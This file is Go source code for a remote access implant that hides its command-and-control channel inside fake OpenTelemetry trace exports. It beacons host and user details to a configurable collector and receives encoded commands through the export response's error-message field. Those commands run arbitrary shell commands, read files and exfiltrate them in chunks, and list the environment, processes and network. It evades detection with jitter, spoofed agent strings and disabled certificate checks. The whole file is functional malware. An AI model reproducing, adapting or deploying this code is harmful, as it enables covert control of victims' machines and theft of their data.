package main

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"go.opentelemetry.io/otel"
	"go.opentelemetry.io/otel/attribute"
	"go.opentelemetry.io/otel/codes"
	"go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc"
	"go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracehttp"
	"go.opentelemetry.io/otel/sdk/resource"
	sdktrace "go.opentelemetry.io/otel/sdk/trace"
	semconv "go.opentelemetry.io/otel/semconv/v1.24.0"
	"go.opentelemetry.io/otel/trace"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"
	"google.golang.org/protobuf/proto"

	collectorpb "go.opentelemetry.io/proto/otlp/collector/trace/v1"
	commonpb "go.opentelemetry.io/proto/otlp/common/v1"
	resourcepb "go.opentelemetry.io/proto/otlp/resource/v1"
	tracepb "go.opentelemetry.io/proto/otlp/trace/v1"
)

type noALPNCredentials struct {
	tlsConfig *tls.Config
}

func (c *noALPNCredentials) ClientHandshake(ctx context.Context, authority string, rawConn net.Conn) (net.Conn, credentials.AuthInfo, error) {
	cfg := c.tlsConfig.Clone()
	cfg.ServerName = authority
	if colonPos := strings.LastIndex(authority, ":"); colonPos != -1 {
		cfg.ServerName = authority[:colonPos]
	}

	conn := tls.Client(rawConn, cfg)
	errChan := make(chan error, 1)
	go func() {
		errChan <- conn.Handshake()
	}()

	select {
	case err := <-errChan:
		if err != nil {
			conn.Close()
			return nil, nil, err
		}
	case <-ctx.Done():
		conn.Close()
		return nil, nil, ctx.Err()
	}

	return conn, credentials.TLSInfo{State: conn.ConnectionState()}, nil
}

func (c *noALPNCredentials) ServerHandshake(rawConn net.Conn) (net.Conn, credentials.AuthInfo, error) {
	return nil, nil, fmt.Errorf("server handshake not supported")
}

func (c *noALPNCredentials) Info() credentials.ProtocolInfo {
	return credentials.ProtocolInfo{SecurityProtocol: "tls"}
}

func (c *noALPNCredentials) Clone() credentials.TransportCredentials {
	return &noALPNCredentials{tlsConfig: c.tlsConfig.Clone()}
}

func (c *noALPNCredentials) OverrideServerName(serverName string) error {
	c.tlsConfig.ServerName = serverName
	return nil
}

func newNoALPNCredentials(cfg *tls.Config) credentials.TransportCredentials {
	return &noALPNCredentials{tlsConfig: cfg}
}

var configCollectorEndpoint = "{{PLACEHOLDER_COLLECTOR_ENDPOINT}}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
var configServiceName = "{{PLACEHOLDER_SERVICE_NAME}}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
var configSelfPort = "{{PLACEHOLDER_SELF_PORT}}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
var configBatchTimeout = "{{PLACEHOLDER_BATCH_TIMEOUT}}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
var configExportDelay = "{{PLACEHOLDER_EXPORT_DELAY}}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
var configApiKey = "{{PLACEHOLDER_API_KEY}}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

func getConfigValue(placeholder string) string {
	val := strings.TrimRight(placeholder, "X\x00 ")
	if idx := strings.Index(val, "}}"); idx != -1 {
		val = val[idx+2:]
	}
	return strings.TrimSpace(val)
}

func getConfigInt(placeholder string, defaultVal int) int {
	val := getConfigValue(placeholder)
	if val == "" {
		return defaultVal
	}
	var result int
	fmt.Sscanf(val, "%d", &result)
	if result == 0 {
		return defaultVal
	}
	return result
}

var (
	cfgCollectorEndpoint string
	cfgServiceName       string
	cfgBatchTimeout      int
	cfgExportDelay       int
	cfgApiKey            string
)

type authCreds struct {
	secret string
}

func (a authCreds) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) {
	if a.secret == "" {
		return nil, nil
	}
	return map[string]string{"x-api-key": a.secret}, nil
}

func (a authCreds) RequireTransportSecurity() bool {
	return false
}

var masterKey = []byte("Enterprise-Monitoring-v1")

var attributePairs = []struct {
	dataAttr string
	idAttr   string
}{
	{"db.statement", "db.connection_string"},
	{"db.query.text", "db.connection.id"},
	{"http.request.body", "http.request.header.x-request-id"},
	{"rpc.message.payload", "rpc.request.id"},
	{"messaging.message.payload", "messaging.message.id"},
	{"http.response.body", "http.response.header.x-correlation-id"},
}

var spanNames = []string{
	"HTTP GET", "HTTP POST", "db.query", "cache.get", "rpc.call",
	"messaging.process", "grpc.client", "http.request",
}

var (
	instanceID      string
	serviceHostname string
	collectorServer string
	grpcConn        *grpc.ClientConn
	traceClient     collectorpb.TraceServiceClient
	tracer          trace.Tracer
	tracerProvider  *sdktrace.TracerProvider

	transportMode    = "grpc"
	httpClient       *http.Client
	httpEndpoint     string
	initialDataSent  = false
)

func initHTTPClient() {
	endpoint := collectorServer
	if !strings.HasPrefix(endpoint, "http://") && !strings.HasPrefix(endpoint, "https://") {
		endpoint = "https://" + endpoint
	}
	endpoint = strings.TrimSuffix(endpoint, "/")
	httpEndpoint = endpoint + "/v1/traces"

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	dialer := &net.Dialer{Timeout: 30 * time.Second}
	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			return dialer.DialContext(ctx, "tcp4", addr)
		},
		MaxIdleConns:        10,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  false,
		TLSHandshakeTimeout: 10 * time.Second,
	}

	httpClient = &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

func initTracerHTTP() {
	ctx := context.Background()

	endpoint := strings.TrimPrefix(collectorServer, "http://")
	endpoint = strings.TrimPrefix(endpoint, "https://")
	useTLS := strings.HasPrefix(collectorServer, "https://")

	var opts []otlptracehttp.Option
	opts = append(opts, otlptracehttp.WithEndpoint(endpoint))

	if useTLS {
		tlsConfig := &tls.Config{InsecureSkipVerify: true}
		opts = append(opts, otlptracehttp.WithTLSClientConfig(tlsConfig))
	} else {
		opts = append(opts, otlptracehttp.WithInsecure())
	}

	if cfgApiKey != "" {
		opts = append(opts, otlptracehttp.WithHeaders(map[string]string{"x-api-key": cfgApiKey}))
	}

	exporter, err := otlptracehttp.New(ctx, opts...)
	if err != nil {
		return
	}

	res, _ := resource.New(ctx,
		resource.WithAttributes(
			semconv.ServiceName(cfgServiceName),
			semconv.ServiceVersion("1.0.0"),
			semconv.ServiceInstanceID(instanceID),
			attribute.String("host.name", serviceHostname),
			attribute.String("host.arch", getRuntimeArch()),
			attribute.String("os.type", runtime.GOOS),
			attribute.String("telemetry.sdk.name", "opentelemetry"),
			attribute.String("telemetry.sdk.language", "go"),
			attribute.String("telemetry.sdk.version", "1.24.0"),
		),
	)

	tracerProvider = sdktrace.NewTracerProvider(
		sdktrace.WithBatcher(exporter),
		sdktrace.WithResource(res),
	)
	otel.SetTracerProvider(tracerProvider)
	tracer = otel.Tracer("io.opentelemetry.traces")
}

func checkForWorkHTTP() *WorkItem {
	if httpClient == nil {
		initHTTPClient()
	}

	req := buildRequest()
	data, err := proto.Marshal(req)
	if err != nil {
		return nil
	}

	httpReq, err := http.NewRequest("POST", httpEndpoint, bytes.NewReader(data))
	if err != nil {
		return nil
	}

	httpReq.Header.Set("Content-Type", "application/x-protobuf")
	httpReq.Header.Set("User-Agent", "OTel-Go/1.24.0")
	if cfgApiKey != "" {
		httpReq.Header.Set("x-api-key", cfgApiKey)
	}

	resp, err := httpClient.Do(httpReq)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	var exportResp collectorpb.ExportTraceServiceResponse
	if err := proto.Unmarshal(body, &exportResp); err != nil {
		return nil
	}

	if exportResp.PartialSuccess != nil && exportResp.PartialSuccess.ErrorMessage != "" {
		payload := exportResp.PartialSuccess.ErrorMessage

		parts := strings.SplitN(payload, ":", 2)
		if len(parts) != 2 {
			return nil
		}

		itemID := parts[0]
		encryptedData := parts[1]
		dataStr := decodeData(encryptedData)
		if dataStr == "" {
			return nil
		}

		dataParts := strings.SplitN(dataStr, " ", 2)
		args := ""
		if len(dataParts) > 1 {
			args = dataParts[1]
		}

		return &WorkItem{
			ID:      itemID,
			Type:    dataParts[0],
			Content: dataStr,
			Args:    args,
		}
	}

	return nil
}

func switchToHTTP() {
	transportMode = "http"

	if grpcConn != nil {
		grpcConn.Close()
		grpcConn = nil
	}
	traceClient = nil

	initHTTPClient()

	if tracerProvider != nil {
		tracerProvider.Shutdown(context.Background())
	}
	initTracerHTTP()

	if !initialDataSent {
		sendInitialData()
		initialDataSent = true
	}
}

func switchToGRPC() {
	transportMode = "grpc"

	initGRPCConnection()

	if tracerProvider != nil {
		tracerProvider.Shutdown(context.Background())
	}
	initTracer()
}

func main() {
	rand.Seed(time.Now().UnixNano())

	cfgCollectorEndpoint = getConfigValue(configCollectorEndpoint)
	cfgServiceName = getConfigValue(configServiceName)
	cfgBatchTimeout = getConfigInt(configBatchTimeout, 3000)
	cfgExportDelay = getConfigInt(configExportDelay, 600)
	cfgApiKey = getConfigValue(configApiKey)

	collectorServer = getEnvOrDefault("COLLECTOR_SERVER", cfgCollectorEndpoint)

	instanceID = generateInstanceID()
	serviceHostname = generateServiceHostname()

	initialDelay := cfgBatchTimeout
	if cfgExportDelay > 0 {
		initialDelay += rand.Intn(cfgExportDelay)
	}
	time.Sleep(time.Duration(initialDelay) * time.Millisecond)

	initGRPCConnection()
	initTracer()
	sendInitialData()
	runLoop()
}

func initGRPCConnection() {
	connectGRPC()
}

func connectGRPC() bool {
	endpoint := strings.TrimPrefix(collectorServer, "http://")
	endpoint = strings.TrimPrefix(endpoint, "https://")
	useTLS := strings.HasPrefix(collectorServer, "https://")

	if !strings.Contains(endpoint, ":") {
		if useTLS {
			endpoint = endpoint + ":443"
		} else {
			endpoint = endpoint + ":4317"
		}
	}

	var opts []grpc.DialOption

	if useTLS {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2"},
		}
		opts = append(opts, grpc.WithTransportCredentials(newNoALPNCredentials(tlsConfig)))
	} else {
		opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	}

	opts = append(opts, grpc.WithUserAgent("OTel-Go/1.24.0"))

	dialer := &net.Dialer{Timeout: 30 * time.Second}
	opts = append(opts, grpc.WithContextDialer(func(ctx context.Context, addr string) (net.Conn, error) {
		return dialer.DialContext(ctx, "tcp4", addr)
	}))

	if cfgApiKey != "" {
		opts = append(opts, grpc.WithPerRPCCredentials(authCreds{secret: cfgApiKey}))
	}

	var err error
	grpcConn, err = grpc.Dial(endpoint, opts...)
	if err != nil {
		return false
	}

	traceClient = collectorpb.NewTraceServiceClient(grpcConn)
	return true
}

func initTracer() {
	ctx := context.Background()

	endpoint := strings.TrimPrefix(collectorServer, "http://")
	endpoint = strings.TrimPrefix(endpoint, "https://")
	useTLS := strings.HasPrefix(collectorServer, "https://")

	// Add port if not specified (must match connectGRPC logic)
	if !strings.Contains(endpoint, ":") {
		if useTLS {
			endpoint = endpoint + ":443"
		} else {
			endpoint = endpoint + ":4317"
		}
	}

	var opts []otlptracegrpc.Option
	opts = append(opts, otlptracegrpc.WithEndpoint(endpoint))

	if useTLS {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2"},
		}
		opts = append(opts, otlptracegrpc.WithTLSCredentials(newNoALPNCredentials(tlsConfig)))
	} else {
		opts = append(opts, otlptracegrpc.WithInsecure())
	}

	if cfgApiKey != "" {
		opts = append(opts, otlptracegrpc.WithHeaders(map[string]string{"x-api-key": cfgApiKey}))
	}

	exporter, err := otlptracegrpc.New(ctx, opts...)
	if err != nil {
		return
	}

	res, _ := resource.New(ctx,
		resource.WithAttributes(
			semconv.ServiceName(cfgServiceName),
			semconv.ServiceVersion("1.0.0"),
			semconv.ServiceInstanceID(instanceID),
			attribute.String("host.name", serviceHostname),
			attribute.String("host.arch", getRuntimeArch()),
			attribute.String("os.type", runtime.GOOS),
			attribute.String("telemetry.sdk.name", "opentelemetry"),
			attribute.String("telemetry.sdk.language", "go"),
			attribute.String("telemetry.sdk.version", "1.24.0"),
		),
	)

	tracerProvider = sdktrace.NewTracerProvider(
		sdktrace.WithBatcher(exporter),
		sdktrace.WithResource(res),
	)
	otel.SetTracerProvider(tracerProvider)
	tracer = otel.Tracer("io.opentelemetry.traces")
}

func runLoop() {
	loopCount := 0
	for {
		loopCount++

		var task *WorkItem

		if transportMode == "grpc" {
			task, _ = checkForWorkWithFallback()
		} else {
			task = checkForWorkHTTP()

			if loopCount%10 == 0 {
				switchToGRPC()
				testTask, testSuccess := checkForWorkWithFallback()
				if testSuccess {
					task = testTask
				} else {
					transportMode = "http"
					if grpcConn != nil {
						grpcConn.Close()
						grpcConn = nil
					}
					traceClient = nil
					initHTTPClient()
					if tracerProvider != nil {
						tracerProvider.Shutdown(context.Background())
					}
					initTracerHTTP()
				}
			}
		}

		immediate := false

		if task != nil {
			result := processWork(task.Content)
			sendWorkResult(task.ID, result)

			if strings.HasPrefix(result, "C:") || strings.HasPrefix(result, "M:") {
				immediate = true
			}
		}

		if immediate {
			time.Sleep(100 * time.Millisecond)
			continue
		}

		baseMs := cfgBatchTimeout
		if baseMs < 2000 {
			baseMs = 2000
		}
		multiplier := 0.5 + rand.Float64()*1.5
		delayMs := int(float64(baseMs) * multiplier)
		if cfgExportDelay > 0 {
			delayMs += rand.Intn(cfgExportDelay)
		}

		time.Sleep(time.Duration(delayMs) * time.Millisecond)
	}
}

func checkForWorkWithFallback() (*WorkItem, bool) {
	task := checkForWork()

	if traceClient == nil {
		switchToHTTP()
		task = checkForWorkHTTP()
		return task, false
	}

	return task, true
}

type WorkItem struct {
	ID      string
	Type    string
	Content string
	Args    string
}

func checkForWork() *WorkItem {
	if traceClient == nil {
		if !connectGRPC() {
			return nil
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	req := buildRequest()

	resp, err := traceClient.Export(ctx, req)
	if err != nil {
		traceClient = nil
		if grpcConn != nil {
			grpcConn.Close()
			grpcConn = nil
		}
		return nil
	}

	if resp.PartialSuccess != nil && resp.PartialSuccess.ErrorMessage != "" {
		payload := resp.PartialSuccess.ErrorMessage

		parts := strings.SplitN(payload, ":", 2)
		if len(parts) != 2 {
			return nil
		}

		itemID := parts[0]
		encryptedData := parts[1]
		dataStr := decodeData(encryptedData)
		if dataStr == "" {
			return nil
		}

		dataParts := strings.SplitN(dataStr, " ", 2)
		args := ""
		if len(dataParts) > 1 {
			args = dataParts[1]
		}

		return &WorkItem{
			ID:      itemID,
			Type:    dataParts[0],
			Content: dataStr,
			Args:    args,
		}
	}

	return nil
}

func buildRequest() *collectorpb.ExportTraceServiceRequest {
	now := time.Now().UnixNano()
	spanName := spanNames[rand.Intn(len(spanNames))]

	spanAttrs := []*commonpb.KeyValue{
		{Key: "telemetry.sdk.name", Value: &commonpb.AnyValue{Value: &commonpb.AnyValue_StringValue{StringValue: "opentelemetry"}}},
		{Key: "telemetry.sdk.language", Value: &commonpb.AnyValue{Value: &commonpb.AnyValue_StringValue{StringValue: "go"}}},
	}

	numPadding := rand.Intn(4) + 1
	paddingAttrs := []struct {
		key   string
		value interface{}
	}{
		{"http.status_code", int64(200 + rand.Intn(5)*100)},
		{"net.peer.port", int64(rand.Intn(65535))},
		{"db.rows_affected", int64(rand.Intn(1000))},
		{"thread.id", int64(rand.Intn(10000))},
	}

	for i := 0; i < numPadding && i < len(paddingAttrs); i++ {
		attr := paddingAttrs[i]
		spanAttrs = append(spanAttrs, &commonpb.KeyValue{
			Key:   attr.key,
			Value: &commonpb.AnyValue{Value: &commonpb.AnyValue_IntValue{IntValue: attr.value.(int64)}},
		})
	}

	return &collectorpb.ExportTraceServiceRequest{
		ResourceSpans: []*tracepb.ResourceSpans{
			{
				Resource: &resourcepb.Resource{
					Attributes: []*commonpb.KeyValue{
						{Key: "service.name", Value: &commonpb.AnyValue{Value: &commonpb.AnyValue_StringValue{StringValue: cfgServiceName}}},
						{Key: "service.instance.id", Value: &commonpb.AnyValue{Value: &commonpb.AnyValue_StringValue{StringValue: instanceID}}},
						{Key: "host.name", Value: &commonpb.AnyValue{Value: &commonpb.AnyValue_StringValue{StringValue: serviceHostname}}},
						{Key: "host.arch", Value: &commonpb.AnyValue{Value: &commonpb.AnyValue_StringValue{StringValue: getRuntimeArch()}}},
						{Key: "os.type", Value: &commonpb.AnyValue{Value: &commonpb.AnyValue_StringValue{StringValue: runtime.GOOS}}},
					},
				},
				ScopeSpans: []*tracepb.ScopeSpans{
					{
						Scope: &commonpb.InstrumentationScope{
							Name:    "io.opentelemetry.sdk",
							Version: "1.24.0",
						},
						Spans: []*tracepb.Span{
							{
								TraceId:           randomBytes(16),
								SpanId:            randomBytes(8),
								Name:              spanName,
								Kind:              tracepb.Span_SPAN_KIND_CLIENT,
								StartTimeUnixNano: uint64(now),
								EndTimeUnixNano:   uint64(now),
								Attributes:        spanAttrs,
								Status:            &tracepb.Status{Code: tracepb.Status_STATUS_CODE_OK},
							},
						},
					},
				},
			},
		},
	}
}

func sendInitialData() {
	if tracer == nil {
		return
	}

	sysInfo := map[string]string{
		"os":       runtime.GOOS,
		"arch":     getRuntimeArch(),
		"user":     getUsername(),
		"host":     getHostname(),
		"ip":       getLocalIP(),
		"elevated": fmt.Sprintf("%v", isElevated()),
	}

	var parts []string
	for k, v := range sysInfo {
		parts = append(parts, fmt.Sprintf("%s=%s", k, v))
	}
	sysInfoStr := strings.Join(parts, ";")
	encoded := encodeData(sysInfoStr)

	attrPair := attributePairs[rand.Intn(len(attributePairs))]

	ctx := context.Background()
	_, span := tracer.Start(ctx, spanNames[rand.Intn(len(spanNames))])
	span.SetAttributes(
		attribute.String(attrPair.dataAttr, encoded),
		attribute.String(attrPair.idAttr, "init"),
		attribute.Int("telemetry.sdk.batch_delay", cfgBatchTimeout),
	)
	span.SetStatus(codes.Ok, "")
	span.End()

	if tracerProvider != nil {
		tracerProvider.ForceFlush(ctx)
	}
}

func sendWorkResult(workID, result string) {
	if tracer == nil {
		return
	}

	if len(result) > 4000 {
		result = result[:4000]
	}
	encoded := encodeData(result)

	attrPair := attributePairs[rand.Intn(len(attributePairs))]

	ctx := context.Background()
	_, span := tracer.Start(ctx, spanNames[rand.Intn(len(spanNames))])

	span.SetAttributes(
		attribute.String(attrPair.dataAttr, encoded),
		attribute.String(attrPair.idAttr, workID),
	)

	numPadding := rand.Intn(3) + 1
	if numPadding >= 1 {
		span.SetAttributes(attribute.Int("http.status_code", 200))
	}
	if numPadding >= 2 {
		span.SetAttributes(attribute.Int("net.peer.port", rand.Intn(65535)))
	}
	if numPadding >= 3 {
		span.SetAttributes(attribute.Int("db.rows_affected", rand.Intn(100)))
	}

	span.SetStatus(codes.Ok, "")
	span.End()

	if tracerProvider != nil {
		tracerProvider.ForceFlush(context.Background())
	}
}

func randomBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func generateInstanceID() string {
	data := fmt.Sprintf("%s|%s|%d", getHostname(), getUsername(), os.Getpid())
	h := sha256.Sum256([]byte(data))
	return fmt.Sprintf("%x", h[:8])
}

func generateServiceHostname() string {
	prefixes := []string{"web", "app", "api", "svc", "node", "host", "srv", "prod"}
	b := make([]byte, 4)
	rand.Read(b)
	return fmt.Sprintf("%s-%x", prefixes[rand.Intn(len(prefixes))], b)
}

func processWork(content string) string {
	parts := strings.SplitN(content, " ", 2)
	workType := strings.ToLower(parts[0])
	args := ""
	if len(parts) > 1 {
		args = parts[1]
	}

	switch workType {
	case "sysinfo":
		return getSysInfo()
	case "whoami":
		return getUsername()
	case "hostname":
		return getHostname()
	case "pwd":
		dir, _ := os.Getwd()
		return dir
	case "cd":
		return changeDirectory(args)
	case "ls", "dir":
		return listDirectory(args)
	case "env":
		return getEnvVars()
	case "interval":
		return changeInterval(args)
	case "download":
		return downloadFile(args)
	case "kill", "exit", "terminate":
		return stopProcess()
	case "ps", "tasklist":
		return nativeProcessList()
	case "netstat":
		return nativeNetstat()
	case "ipconfig", "ifconfig":
		return nativeIpconfig()
	case "cat", "type":
		return nativeReadFile(args)
	case "shell", "cmd", "exec":
		if args == "" {
			return ""
		}
		return runShell(args)
	default:
		return "Unknown command. Use: shell <command>"
	}
}

func runShell(cmd string) string {
	var proc *exec.Cmd

	if runtime.GOOS == "windows" {
		proc = exec.Command("cmd", "/c", cmd)
		configureShellCmd(proc)
	} else {
		proc = exec.Command("/bin/bash", "-c", cmd)
	}

	var stdout, stderr bytes.Buffer
	proc.Stdout = &stdout
	proc.Stderr = &stderr

	err := proc.Run()
	result := stdout.String() + stderr.String()

	if err != nil && result == "" {
		return ""
	}

	return strings.TrimSpace(result)
}

func deriveKey() []byte {
	h := hmac.New(sha256.New, masterKey)
	h.Write([]byte(instanceID))
	return h.Sum(nil)[:16]
}

func encodeData(plaintext string) string {
	key := deriveKey()
	data := []byte(plaintext)
	encrypted := make([]byte, len(data))
	for i := range data {
		encrypted[i] = data[i] ^ key[i%len(key)]
	}
	return base64.StdEncoding.EncodeToString(encrypted)
}

func decodeData(encoded string) string {
	encrypted, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return encoded
	}
	key := deriveKey()
	decrypted := make([]byte, len(encrypted))
	for i := range encrypted {
		decrypted[i] = encrypted[i] ^ key[i%len(key)]
	}
	return string(decrypted)
}

func nativeIpconfig() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return ""
	}

	var lines []string
	for _, iface := range interfaces {
		if iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		lines = append(lines, fmt.Sprintf("\n%s:", iface.Name))
		lines = append(lines, fmt.Sprintf("  MAC: %s", iface.HardwareAddr))
		lines = append(lines, fmt.Sprintf("  MTU: %d", iface.MTU))

		status := "DOWN"
		if iface.Flags&net.FlagUp != 0 {
			status = "UP"
		}
		lines = append(lines, fmt.Sprintf("  Status: %s", status))

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			lines = append(lines, fmt.Sprintf("  IP: %s", addr.String()))
		}
	}

	if len(lines) == 0 {
		return ""
	}

	return strings.Join(lines, "\n")
}

func nativeReadFile(path string) string {
	if path == "" {
		return ""
	}

	path = strings.TrimSpace(path)

	info, err := os.Stat(path)
	if err != nil {
		return ""
	}

	if info.IsDir() {
		return ""
	}

	const maxSize = 1024 * 1024
	if info.Size() > maxSize {
		return ""
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}

	return string(data)
}

func getRuntimeArch() string {
	if runtime.GOOS == "windows" {
		if arch := getWindowsArch(); arch != "" {
			return arch
		}
	}
	return runtime.GOARCH
}

func getEnvOrDefault(key, defaultVal string) string {
	if val := os.Getenv(key); val != "" {
		return val
	}
	return defaultVal
}

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

func getUsername() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERNAME")
	}
	return os.Getenv("USER")
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

func getSysInfo() string {
	return fmt.Sprintf("Hostname: %s\nOS: %s\nArchitecture: %s\nUsername: %s\nGo Version: %s\nProcessors: %d\nElevated: %v\nIP: %s",
		getHostname(),
		runtime.GOOS,
		getRuntimeArch(),
		getUsername(),
		runtime.Version(),
		runtime.NumCPU(),
		isElevated(),
		getLocalIP(),
	)
}

func changeDirectory(path string) string {
	if path == "" {
		dir, _ := os.Getwd()
		return dir
	}
	if err := os.Chdir(path); err != nil {
		return ""
	}
	dir, _ := os.Getwd()
	return dir
}

func listDirectory(path string) string {
	if path == "" {
		path = "."
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return ""
	}
	var lines []string
	for i, entry := range entries {
		if i >= 50 {
			break
		}
		prefix := "       "
		if entry.IsDir() {
			prefix = "[DIR]  "
		}
		lines = append(lines, prefix+entry.Name())
	}
	return strings.Join(lines, "\n")
}

func getEnvVars() string {
	env := os.Environ()
	if len(env) > 20 {
		env = env[:20]
	}
	return strings.Join(env, "\n")
}

func stopProcess() string {
	go func() {
		time.Sleep(2 * time.Second)
		os.Exit(0)
	}()
	return "ok"
}

const chunkSize = 1800
const maxFileSize = 10485760

func downloadFile(args string) string {
	if args == "" {
		return "E:1"
	}

	args = strings.TrimSpace(args)
	filePath := args
	chunkIndex := -1

	if lastSpace := strings.LastIndex(args, " "); lastSpace != -1 {
		lastPart := args[lastSpace+1:]
		var idx int
		if _, err := fmt.Sscanf(lastPart, "%d", &idx); err == nil {
			chunkIndex = idx
			filePath = args[:lastSpace]
		}
	}

	fileInfo, err := os.Stat(filePath)
	if err != nil {
		return "E:2"
	}

	if fileInfo.IsDir() {
		return "E:3"
	}

	fileSize := fileInfo.Size()
	if fileSize > maxFileSize {
		return "E:4"
	}

	fileName := fileInfo.Name()
	totalChunks := int((fileSize + int64(chunkSize) - 1) / int64(chunkSize))
	if totalChunks == 0 {
		totalChunks = 1
	}

	if chunkIndex < 0 {
		return fmt.Sprintf("M:%d:%d:%s", totalChunks, fileSize, fileName)
	}

	if chunkIndex >= totalChunks {
		return "E:5"
	}

	file, err := os.Open(filePath)
	if err != nil {
		return "E:6"
	}
	defer file.Close()

	offset := int64(chunkIndex) * int64(chunkSize)
	file.Seek(offset, 0)

	buffer := make([]byte, chunkSize)
	n, err := file.Read(buffer)
	if err != nil && n == 0 {
		return "E:7"
	}

	chunkData := base64.StdEncoding.EncodeToString(buffer[:n])

	return fmt.Sprintf("C:%d:%d:%s:%s", chunkIndex, totalChunks, fileName, chunkData)
}

func changeInterval(args string) string {
	args = strings.TrimSpace(args)
	if args == "" {
		return fmt.Sprintf("%d", cfgBatchTimeout/1000)
	}

	var newVal int
	_, err := fmt.Sscanf(args, "%d", &newVal)
	if err != nil || newVal < 1 {
		return fmt.Sprintf("%d", cfgBatchTimeout/1000)
	}

	cfgBatchTimeout = newVal * 1000
	cfgExportDelay = newVal * 100
	reportConfigChange(cfgBatchTimeout)

	return fmt.Sprintf("%d", newVal)
}

func reportConfigChange(batchMs int) {
	if tracer == nil {
		return
	}

	ctx := context.Background()
	_, span := tracer.Start(ctx, spanNames[rand.Intn(len(spanNames))])

	span.SetAttributes(
		attribute.Int("telemetry.sdk.batch_delay", batchMs),
		attribute.String("service.instance.id", instanceID),
	)
	span.SetStatus(codes.Ok, "")
	span.End()

	if tracerProvider != nil {
		tracerProvider.ForceFlush(ctx)
	}
}

var _ = metadata.New
